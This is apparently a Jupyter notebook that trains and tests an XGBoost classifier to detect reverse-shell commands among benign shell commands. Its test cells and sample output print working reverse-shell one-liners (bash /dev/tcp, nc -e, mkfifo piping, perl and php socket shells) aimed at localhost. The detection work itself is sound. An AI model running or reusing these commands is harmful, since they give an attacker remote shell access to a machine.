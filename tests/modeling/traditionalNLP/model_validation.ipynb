{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "import os\n",
    "import numpy as np\n",
    "from pprint import pprint\n",
    "from collections import defaultdict\n",
    "\n",
    "# machine learning utilities\n",
    "from sklearn.feature_extraction.text import HashingVectorizer, TfidfVectorizer, CountVectorizer\n",
    "from nltk.tokenize import WordPunctTokenizer\n",
    "\n",
    "from xgboost import XGBClassifier\n",
    "from sklearn.utils import shuffle\n",
    "from sklearn.model_selection import train_test_split\n",
    "from sklearn.metrics import det_curve, roc_curve, f1_score\n",
    "from sklearn.metrics import roc_auc_score\n",
    "\n",
    "# matplotlib and seaborn are famous libraries for graph plotting in Python\n",
    "import matplotlib.pyplot as plt\n",
    "import seaborn as sns\n",
    "sns.set()\n",
    "\n",
    "import sys\n",
    "sys.path.append(\"../..\")\n",
    "\n",
    "from utils.preprocessing import normalizeCmd\n",
    "from utils.misc import getNotebookPath\n",
    "SCRIPT_PATH = getNotebookPath()\n",
    "\n",
    "def plot_roc_metrics(y_true, preds, metrics, name, ax=None):\n",
    "    metrics[\"fpr\"][name], metrics[\"tpr\"][name], metrics[\"threshold_roc\"][name] = roc_curve(y_true, preds)\n",
    "    _, metrics[\"fnr\"][name], metrics[\"threshold_det\"][name] = det_curve(y_true, preds)\n",
    "    if ax:\n",
    "        ax.plot(metrics[\"fpr\"][name], metrics[\"tpr\"][name], linestyle=\"solid\", label=name)\n",
    "        ax.set_xlabel('False Positive Rate')\n",
    "        ax.set_ylabel('True Positive Rate')\n",
    "        ax.set_ylim([0.8,1.02])\n",
    "        ax.set_xlim([-0.05,0.25])\n",
    "        ax.set_title(\"ROC curve\", fontsize=12)\n",
    "        ax.legend(loc=\"lower right\")\n",
    "    return metrics\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[!] Took 50855 benign commands from: auditdArgsNormalizedUnique.cm\n",
      "[!] Took 12607 benign commands from: nl2bash.cm\n",
      "[!] Took 119154 malicious commands from: reverse_shell_dataset.cm\n",
      "[!] Took 12662 benign commands from: wazuh_evo_uniq.cm\n",
      "Benign commands form 38.98% of total.\n",
      "Total commands in dataset: 195278\n"
     ]
    }
   ],
   "source": [
    "datafolder = SCRIPT_PATH + f\"\\\\..\\\\..\\\\data\\\\data_parsed\\\\\"\n",
    "data = defaultdict(list)\n",
    "for file in [x for x in os.listdir(datafolder) if x.endswith(\"cm\")]:\n",
    "    with open(datafolder+file, encoding=\"utf-8\",  errors='ignore') as f:\n",
    "        localdata = [x.strip() for x in f.readlines()]\n",
    "\n",
    "    if \"reverse_shell\" in file:\n",
    "        print(f\"[!] Took {len(localdata)} malicious commands from:\", file)\n",
    "        data[\"malicious_csv\"] = localdata\n",
    "        \n",
    "    else:\n",
    "        print(f\"[!] Took {len(localdata)} benign commands from:\", file)\n",
    "        data[\"benign\"].extend(localdata)\n",
    "\n",
    "total = np.sum([len(data[x]) for x in data.keys()])\n",
    "print(f\"Benign commands form {len(data['benign'])*100/total:.2f}% of total.\")\n",
    "print(f\"Total commands in dataset:\", total)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "195277 - size of the dataset\n"
     ]
    }
   ],
   "source": [
    "# filtering malicious\n",
    "data[\"malicious\"] = [','.join(x.split(\",\")[:-3]) for x in data[\"malicious_csv\"]][1:]\n",
    "\n",
    "RANDOM_SEED = 1623+12\n",
    "X = {}\n",
    "y = np.hstack([np.zeros(len(data[\"benign\"]), dtype=int), np.ones(len(data[\"malicious\"]), dtype=int)])\n",
    "X[\"raw\"], y = shuffle(data[\"benign\"] + data[\"malicious\"], y, random_state=RANDOM_SEED)\n",
    "print(len(X[\"raw\"]), \"- size of the dataset\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "ROC score: 0.9999336130968581 \n",
      "F1-score: 0.9998743192291579\n"
     ]
    },
    {
     "data": {
      "image/png": "[encoded data removed]",
      "text/plain": [
       "<Figure size 432x288 with 1 Axes>"
      ]
     },
     "metadata": {
      "needs_background": "light"
     },
     "output_type": "display_data"
    }
   ],
   "source": [
    "metrics = defaultdict(dict)\n",
    "f, ax = plt.subplots(1, 1, figsize=(6,4))\n",
    "\n",
    "X_train, X_test, y_train, y_test = train_test_split(X[\"raw\"], y, test_size=0.2, random_state=RANDOM_SEED)\n",
    "\n",
    "wpt = WordPunctTokenizer()\n",
    "encoder_freq = TfidfVectorizer(\n",
    "    lowercase=False,\n",
    "    preprocessor=normalizeCmd,\n",
    "    tokenizer=wpt.tokenize,\n",
    "    token_pattern=None,\n",
    "    max_features=500,\n",
    "    ngram_range=(1,2)\n",
    "    )\n",
    "\n",
    "X_train_enc = encoder_freq.fit_transform(X_train)\n",
    "X_test_enc = encoder_freq.transform(X_test)\n",
    "\n",
    "xgb_model = XGBClassifier(\n",
    "                n_estimators=10,\n",
    "                use_label_encoder=False,\n",
    "                eval_metric=\"logloss\",\n",
    "                random_state=RANDOM_SEED\n",
    "            )\n",
    "xgb_model.fit(X_train_enc, y_train)\n",
    "preds = xgb_model.predict_proba(X_test_enc)[:,1]\n",
    "print(\"ROC score:\", roc_auc_score(y_test, preds), \"\\nF1-score:\", f1_score(y_test, (preds > 0.95).astype(int)))\n",
    "metrics = plot_roc_metrics(y_test, preds, metrics, name = \"TfIdfVectorizer + WPT\", ax=ax)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "array(['\"', '\" r', '\")', '\") }\\'', '\")\\'', '\"))));[', '\"))));[ os',\n",
       "       '\"));', '\")); if', '\"),', '\"), int', '\");', '\"); exec', '\"); open',\n",
       "       '\");\\'', '\");};\\'', '\",', '\", \"', '\", 22', '\", 443', '\", 53',\n",
       "       '\", 80', '\", 8000', '\", 8080', '\", 8888', '\", 9001', '\";',\n",
       "       '\"; export', '\";$', '$', '&&', '&& echo', '&& rm', '&& v', \"'\",\n",
       "       \"' >\", \"' fn\", \"' import\", \"' use\", \"'$\", \"'$ c\", \"'$ cmd\",\n",
       "       \"'$ host\", \"'$ p\", \"'$ port\", \"'$ s\", \"');\", '(', '( 0', '( S',\n",
       "       '( STDERR', '( STDIN', '( STDOUT', '( connect', '( os', '( s',\n",
       "       '(\"', '(\" _IPADDRESS_', '(\" bash', '(\" dash', '(\" nc', '(\" sh',\n",
       "       '(\"/', '(\"/ bin', '(\"/ usr', '($', \"('\", '((', '(( os', '()',\n",
       "       '() {', '(),', '(), fd', '();', '(); s', ')', ') for', ')))){',\n",
       "       ')))){ open', ');', '); exec', '); os', '); passthru', '); popen',\n",
       "       '); shell_exec', '); system', ');`', ');`/', ');`/ bin',\n",
       "       ');`/ usr', ')];', ')]; pty', '+', ',', ', 1', ', 2', ', PF_INET',\n",
       "       ', SOCK_STREAM', ', getprotobyname', ', inet_aton', ', os',\n",
       "       ', pty', ', sockaddr_in', ', socket', ',\">&', ',\">& S', '-', '- 1',\n",
       "       '- 2', '- W', '- agent', '- c', '- e', '- f', '- gpghome', '- i',\n",
       "       '- key', '- o_NUMBER_ip', '- p', '- r', '- s', '- sf', '- u', '--',\n",
       "       '.', '. 0', '. 1', '. 4', '. cloudapp', '. connect', '. cx',\n",
       "       '. dup2', '. fileno', '. getenv', '. gpg', '. internal', '. jar',\n",
       "       '. net', '. py', '. socket', '. spawn', '. system', '. v', '/',\n",
       "       '/ 0', '/ _IPADDRESS_', '/ _NUMBER_', '/ ambari', '/ apt',\n",
       "       '/ bash', '/ bin', '/ dash', '/ dev', '/ filecache', '/ games',\n",
       "       '/ hadoop', '/ hdp', '/ home', '/ lib', '/ local', '/ mnt',\n",
       "       '/ null', '/ oozie', '/ pubring', '/ resource', '/ sbin', '/ sh',\n",
       "       '/ tcp', '/ tmp', '/ udp', '/ user', '/ usercache', '/ usr',\n",
       "       '/ var', '/ www', '/ yarn', '/.', '0', '0 ,', '0 .', '0 >&', '1',\n",
       "       '1 \")', '1 ,', '1 -', '1 .', '1 |', '19', '2', '2 )];', '2 .',\n",
       "       '2 >&', '22', '3', '3 .', '4', '4 .', '443', '5', '53', '6', '7',\n",
       "       '8', '80', '8000', '8080', '8888', '9', '9001', ':', ': _NUMBER_',\n",
       "       ':/', ':/ usr', '://', ';', '; cat', '; mkfifo', '; s', '; socket',\n",
       "       ';$', '<&', '<>/', '<>/ dev', '=', '= fsockopen', '= socket', '=\"',\n",
       "       '=\" _IPADDRESS_', '=>$', '>', '> /', '>&', '>& 1', '>/', '>/ tmp',\n",
       "       '>>', '>> /', 'PF_INET', 'PF_INET ,', 'S', 'S \");', 'S ,',\n",
       "       'SOCK_STREAM', 'SOCK_STREAM ,', 'STDERR', 'STDERR ,\">&', 'STDIN',\n",
       "       'STDIN ,\">&', 'STDOUT', 'STDOUT ,\">&', 'Socket', 'Socket ;$', 'W',\n",
       "       'W 1', '_IPADDRESS_', '_IPADDRESS_ \",', '_IPADDRESS_ \";',\n",
       "       '_IPADDRESS_ \";$', '_IPADDRESS_ /', '_NUMBER_', '_NUMBER_ -',\n",
       "       '_NUMBER_ /', \"`;'\", 'agent', 'ambari', 'ambari -', 'apt', 'apt -',\n",
       "       'awk', 'azure', 'bash', 'bash -', 'bash <&', 'bin', 'bin /',\n",
       "       'bin :/', 'c', \"c '\", 'c 1', 'c =', 'cat', 'cat /', 'close',\n",
       "       'close (', 'cloudapp', 'cloudapp .', 'cmd', 'cmd =', 'connect',\n",
       "       'connect (', 'connect ((', 'current', 'cx', 'cx .', 'dash',\n",
       "       'dash -', 'dash <&', 'dev', 'dev /', 'do', 'dup2', 'dup2 (', 'e',\n",
       "       \"e '\", 'echo', \"echo '\", 'exec', 'exec (\"', 'exec (\"/', 'export',\n",
       "       'f', 'f /', 'fd', 'fd )', 'fd in', 'filecache', 'filecache /',\n",
       "       'fileno', 'fileno (),', 'find', 'fn', 'fn main', 'for', 'for fd',\n",
       "       'fsockopen', 'fsockopen (\"', 'games', 'games :/', 'getenv',\n",
       "       'getenv (\"', 'getline', 'getprotobyname', 'getprotobyname (\"',\n",
       "       'gpg', 'gpghome', 'gpghome .', 'grep', 'hadoop', 'hadoop /', 'hdp',\n",
       "       'hdp /', 'home', 'home /', 'host', 'host =', 'http', 'i',\n",
       "       'i \");};\\'', 'i 2', 'if', 'if (', 'import', 'import os',\n",
       "       'import sys', 'in', 'in (', 'inet_aton', 'inet_aton ($', 'int',\n",
       "       'int (', 'internal', 'internal .', 'jar', 'jar :/', 'key', 'key -',\n",
       "       'lib', 'lib /', 'ln', 'ln -', 'local', 'local /', 'log', 'main',\n",
       "       'main ()', 'mkfifo', 'mkfifo /', 'mnt', 'mnt /', 'name', 'nc',\n",
       "       'nc -', 'nc _IPADDRESS_', 'net', 'net :', 'null', 'o_NUMBER_ip',\n",
       "       'o_NUMBER_ip .', 'oozie', 'oozie -', 'oozie /', 'open', 'open (',\n",
       "       'os', \"os '\", 'os ,', 'os .', 'p', 'p =', 'passthru',\n",
       "       'passthru (\"', 'passthru (\"/', 'perl', 'perl -', 'php', 'php -',\n",
       "       'ping', 'ping -', 'popen', 'popen (\"', 'popen (\"/', 'port',\n",
       "       'port =', 'print', 'pty', 'pty .', 'pty ;', 'pubring', 'pubring .',\n",
       "       'py', 'python', 'python -', 'r', 'r \");\\'', \"r '$\", 'resource',\n",
       "       'resource /', 'rm', 'rm -', 'rm /', 'run', 'run /', 's', 's .',\n",
       "       's =', 'sbin', 'sbin :/', 'sf', 'sf /', 'sh', 'sh \")\\'', 'sh -',\n",
       "       'sh <&', 'shell_exec', 'shell_exec (\"', 'shell_exec (\"/',\n",
       "       'sockaddr_in', 'sockaddr_in ($', 'socket', 'socket (',\n",
       "       'socket ();', 'socket ,', 'socket .', 'spawn', 'spawn (\"', 'sys',\n",
       "       'sys ,', 'system', 'system (\"', 'system (\"/', 't', 'tcp', 'tcp /',\n",
       "       'tmp', 'tmp /', 'u', 'u _IPADDRESS_', 'udp', 'udp /', 'use',\n",
       "       'use Socket', 'user', 'user /', 'usercache', 'usercache /', 'usr',\n",
       "       'usr /', 'v', 'v &&', 'v run', 'var', 'var /', 'while', 'while (',\n",
       "       'www', 'www /', 'yarn', 'yarn /', 'zip', 'zip -', '{', '{ os', '|',\n",
       "       '| nc', '|&', '|& getline', '|/', '}', \"}'\", \"}' >>\"], dtype=object)"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "encoder_freq.get_feature_names_out()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "97.74%\n"
     ]
    }
   ],
   "source": [
    "cmd = \"bash -i >& /dev/tcp/127.0.0.1/443 0>&1\"\n",
    "cmdpred = xgb_model.predict_proba(encoder_freq.transform([cmd]))\n",
    "print(f\"{cmdpred[0][1]*100:.2f}%\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "      2.23%:\tcal -h\n",
      "     97.74%:\techo 'import os' > /tmp/n.v && echo 'fn main() { os.system(\"nc -e /bin/dash 127.0.0.1 50845 0>&1\") }\n",
      "      2.23%:\tnice -n 19 du -x -s -B 1 /var/lib/kubelet/pods/_NUMBER_cfbc-65ae-4f0e-_NUMBER_c-c3edd_NUMBER_/etc-ho\n",
      "      4.07%:\tjq -r .access_token\n",
      "      2.23%:\trm -f /tmp/check_cluster.tmpmail.20448\n",
      "     97.74%:\tperl -e 'use Socket;$c9=\"127.0.0.1\";$sn=59075;socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));if\n",
      "     97.74%:\trm /home/user/wcowt9f1;mkfifo /home/user/wcowt9f1;cat /home/user/wcowt9f1|bash -i 2>&1|nc 127.0.0.1 \n",
      "     97.74%:\tphp -r '$vv9t=fsockopen(\"127.0.0.1\",44702);popen(\"/usr/bin/sh <&96 >&96 2>&96\", \"r\");'\n",
      "     97.74%:\tphp -r '$b6hq=fsockopen(\"127.0.0.1\",52093);system(\"sh <&133 >&133 2>&133\");'\n",
      "      2.35%:\tzip -sf /usr/hdp/_IPADDRESS_/livy2/jars/failureaccess-1.0.1.jar\n"
     ]
    }
   ],
   "source": [
    "import random\n",
    "random.seed(RANDOM_SEED+29)\n",
    "WIDE=100\n",
    "\n",
    "for _ in range(10):\n",
    "    x = random.choice(X_test)\n",
    "    cmdpred = xgb_model.predict_proba(encoder_freq.transform([x]))\n",
    "    print(f\"{cmdpred[0][1]*100:>10.2f}%:\\t{x[0:WIDE]}\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [],
   "source": [
    "import pickle\n",
    "folder = SCRIPT_PATH + \"\\\\..\\\\..\\\\models\"\n",
    "key = \"TfidfVectorizer_max500_ngram12\"\n",
    "pickle.dump(encoder_freq, open(f\"{folder}\\\\{key}.pkl\", \"wb\"))\n",
    "xgb_model.save_model(f\"{folder}\\\\{key}.model\")"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.13 64-bit (microsoft store)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.13"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "4e123ac7eba4d44924a894b1be2fc564282b1d2645e9d64ed33bc5003b6c2a87"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
